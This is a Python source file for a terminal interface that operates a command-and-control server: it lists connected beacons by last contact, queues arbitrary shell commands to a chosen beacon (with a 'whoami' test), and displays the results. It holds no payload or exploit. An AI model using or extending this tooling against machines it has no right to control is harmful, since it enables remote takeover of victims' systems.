import asyncio
import datetime
from typing import Dict, Optional

import httpx
from textual.app import App, ComposeResult
from textual.containers import Container, Horizontal, Vertical
from textual.screen import ModalScreen
from textual.widgets import (
    Button,
    DataTable,
    Footer,
    Header,
    Input,
    Label,
    RichLog,
    Static,
    TabbedContent,
    TabPane,
    TextArea,
)
from textual.reactive import reactive


class TaskOutputModal(ModalScreen):
    """Modal screen to show full task output."""
    
    def __init__(self, task_data: dict):
        super().__init__()
        self.task_data = task_data
    
    def compose(self) -> ComposeResult:
        with Container(id="output-modal"):
            yield Label(f"Task: {self.task_data.get('command', 'Unknown')}", id="task-command")
            yield Label(f"Status: {self.get_status_text()}", id="task-status")
            yield TextArea(
                self.task_data.get('output', 'No output available'),
                read_only=True,
                id="task-output-area"
            )
            yield Button("Close", id="close-modal")
    
    def get_status_text(self) -> str:
        status_map = {-1: "❌ Error", 0: "✅ Complete", 2: "⏳ Pending"}
        return status_map.get(self.task_data.get("status"), "❓ Unknown")
    
    async def on_button_pressed(self, event: Button.Pressed) -> None:
        if event.button.id == "close-modal":
            self.dismiss()


class C2ManagerApp(App):
    """Textual TUI app for managing the FastAPI C2 server."""

    CSS = """
    .connections-panel {
        width: 1fr;
        height: 1fr;
        border: solid $primary;
        margin: 1;
    }
    
    .tasks-panel {
        width: 1fr;
        height: 1fr;
        border: solid $secondary;
        margin: 1;
    }
    
    .command-input {
        width: 1fr;
        margin: 1;
    }
    
    .logs-panel {
        height: 15;
        border: solid $accent;
        margin: 1;
    }
    
    #output-modal {
        width: 80%;
        height: 80%;
        border: solid $primary;
        background: $surface;
        padding: 1;
    }
    
    #task-output-area {
        height: 1fr;
        margin-top: 1;
        margin-bottom: 1;
    }
    """

    BINDINGS = [
        ("q", "quit", "Quit"),
        ("r", "refresh", "Refresh"),
        ("c", "clear_logs", "Clear Logs"),
        ("t", "test_command", "Test Command"),
    ]

    selected_connection: reactive[Optional[str]] = reactive(None)

    def __init__(self):
        super().__init__()
        self.api_base_url = "http://localhost:8000"
        self.client = httpx.AsyncClient()
        self.connections_data: Dict = {}

    async def on_mount(self) -> None:
        """Called when app starts."""
        self.set_interval(5.0, self.refresh_status)
        await self.refresh_status()

    def compose(self) -> ComposeResult:
        """Create child widgets for the app."""
        yield Header()

        with TabbedContent(initial="connections"):
            with TabPane("Connections", id="connections"):
                with Horizontal():
                    with Vertical(classes="connections-panel"):
                        yield Static("Active Connections", id="connections-title")
                        yield DataTable(id="connections-table")

                    with Vertical(classes="tasks-panel"):
                        yield Static("Tasks for Selected Connection", id="tasks-title")
                        yield DataTable(id="tasks-table")

                with Horizontal(classes="command-input"):
                    yield Input(
                        placeholder="Enter command to send to selected beacon...",
                        id="command-input",
                    )
                    yield Button("Send Command", id="send-command")

            with TabPane("Logs", id="logs"):
                yield RichLog(id="app-logs", classes="logs-panel")

        yield Footer()

    async def refresh_status(self) -> None:
        """Fetch status from the C2 server."""
        try:
            response = await self.client.get(f"{self.api_base_url}/status")
            if response.status_code == 200:
                self.connections_data = response.json()
                self.update_connections_table()
                self.log_message(
                    f"Refreshed status: {len(self.connections_data)} connections"
                )
            else:
                self.log_message(f"Error fetching status: HTTP {response.status_code}")
        except Exception as e:
            self.log_message(f"Failed to connect to C2 server: {e}")

    def update_connections_table(self) -> None:
        """Update the connections table with current data."""
        table = self.query_one("#connections-table", DataTable)
        table.clear(columns=True)

        if not self.connections_data:
            return

        table.cursor_type = "row"
        table.add_columns("Connection ID", "Last Contact", "Active Tasks", "Status")

        for conn_id, data in self.connections_data.items():
            last_contact = data.get("last_contact", "Unknown")
            tasks = data.get("tasks", [])
            active_tasks = len(
                [t for t in tasks if t.get("status") == 2]
            )  # PENDING = 2

            # Determine status based on last contact time
            try:
                if isinstance(last_contact, str) and last_contact != "Unknown":
                    last_time = datetime.datetime.fromisoformat(
                        last_contact.replace("T", " ")
                    )
                    time_diff = datetime.datetime.now() - last_time
                    if time_diff.total_seconds() < 30:
                        status = "🟢 Online"
                    elif time_diff.total_seconds() < 120:
                        status = "🟡 Stale"
                    else:
                        status = "🔴 Offline"
                else:
                    status = "❓ Unknown"
            except:
                status = "❓ Unknown"

            table.add_row(
                str(conn_id)[:8] + "...",
                str(last_contact)[:19] if last_contact != "Unknown" else "Unknown",
                str(active_tasks),
                status,
                key=str(conn_id)
            )

    def update_tasks_table(self, connection_id: str) -> None:
        """Update the tasks table for the selected connection."""
        table = self.query_one("#tasks-table", DataTable)
        table.clear(columns=True)

        if not self.connections_data or connection_id not in self.connections_data:
            return

        table.cursor_type = "row"
        table.add_columns("Task ID", "Command", "Status", "Output (click for full)")

        tasks = self.connections_data[connection_id].get("tasks", [])
        for i, task in enumerate(tasks):
            status_map = {-1: "❌ Error", 0: "✅ Complete", 2: "⏳ Pending"}
            status_text = status_map.get(task.get("status"), "❓ Unknown")

            output = task.get("output", "")
            output_preview = (output[:30] + "...") if len(output) > 30 else output

            table.add_row(
                str(task.get("uid", ""))[:8] + "...",
                task.get("command", "")[:30],
                status_text,
                output_preview,
                key=f"task_{i}"
            )

    def log_message(self, message: str) -> None:
        """Add a message to the logs."""
        log_widget = self.query_one("#app-logs", RichLog)
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        log_widget.write(f"[{timestamp}] {message}")

    async def on_data_table_row_selected(self, event: DataTable.RowSelected) -> None:
        """Handle table row selection."""
        if event.data_table.id == "connections-table":
            # Extract the actual UUID string from the RowKey
            self.selected_connection = event.row_key.value
            self.update_tasks_table(self.selected_connection)
            self.log_message(f"Selected connection: {self.selected_connection}")
        elif event.data_table.id == "tasks-table":
            # Show full output for selected task
            await self.show_task_output(event.row_key.value)

    async def on_button_pressed(self, event: Button.Pressed) -> None:
        """Handle button presses."""
        if event.button.id == "send-command":
            await self.send_command()

    async def on_input_submitted(self, event: Input.Submitted) -> None:
        """Handle command input submission."""
        if event.input.id == "command-input":
            await self.send_command()

    async def send_command(self) -> None:
        """Send a command to the selected connection."""
        self.log_message(f"send_command called. Selected connection: {self.selected_connection}, type: {type(self.selected_connection)}")
        
        if not self.selected_connection:
            self.log_message("No connection selected")
            return

        command_input = self.query_one("#command-input", Input)
        command = command_input.value.strip()
        self.log_message(f"Command to send: '{command}'")

        if not command:
            self.log_message("No command entered")
            return

        try:
            # Ensure selected_connection is a string
            connection_str = str(self.selected_connection)
            url = f"{self.api_base_url}/add_task/{connection_str}"
            params = {"command": command}
            
            self.log_message(f"Making POST request to: {url} with params: {params}")
            response = await self.client.post(url, params=params)

            if response.status_code == 200:
                self.log_message(
                    f"Command sent: '{command}' to {connection_str[:8]}..."
                )
                command_input.value = ""
                # Refresh to show the new task
                await self.refresh_status()
            else:
                try:
                    error_detail = response.text
                    self.log_message(f"Error sending command: HTTP {response.status_code}, Response: {error_detail}")
                except:
                    self.log_message(f"Error sending command: HTTP {response.status_code}")
        except Exception as e:
            self.log_message(f"Failed to send command: {e}")

    async def show_task_output(self, task_key: str) -> None:
        """Show full output for a selected task."""
        if not self.selected_connection or not self.connections_data:
            return
        
        connection_data = self.connections_data.get(self.selected_connection)
        if not connection_data:
            return
        
        tasks = connection_data.get("tasks", [])
        try:
            # Extract task index from key (format: "task_0", "task_1", etc.)
            task_index = int(task_key.split("_")[1])
            if 0 <= task_index < len(tasks):
                task_data = tasks[task_index]
                self.push_screen(TaskOutputModal(task_data))
        except (IndexError, ValueError):
            self.log_message(f"Could not find task for key: {task_key}")

    def action_refresh(self) -> None:
        """Refresh the status manually."""
        asyncio.create_task(self.refresh_status())

    def action_clear_logs(self) -> None:
        """Clear the logs panel."""
        log_widget = self.query_one("#app-logs", RichLog)
        log_widget.clear()
    
    def action_test_command(self) -> None:
        """Send a test command to the first available connection."""
        if not self.connections_data:
            self.log_message("No connections available for test command")
            return
        
        # Get the first connection
        first_conn_id = list(self.connections_data.keys())[0]
        self.selected_connection = str(first_conn_id)
        self.log_message(f"Test mode: Selected connection {str(first_conn_id)[:8]}...")
        
        # Send a simple test command
        asyncio.create_task(self._send_test_command("whoami"))
    
    async def _send_test_command(self, command: str) -> None:
        """Helper to send a test command."""
        if not self.selected_connection:
            return
            
        try:
            url = f"{self.api_base_url}/add_task/{self.selected_connection}"
            params = {"command": command}
            response = await self.client.post(url, params=params)
            
            if response.status_code == 200:
                self.log_message(f"Test command '{command}' sent successfully")
                await self.refresh_status()
            else:
                self.log_message(f"Test command failed: HTTP {response.status_code}")
        except Exception as e:
            self.log_message(f"Test command error: {e}")

    async def on_unmount(self) -> None:
        """Clean up when app closes."""
        await self.client.aclose()


def main():
    """Run the C2 Manager TUI application."""
    app = C2ManagerApp()
    app.run()


if __name__ == "__main__":
    main()
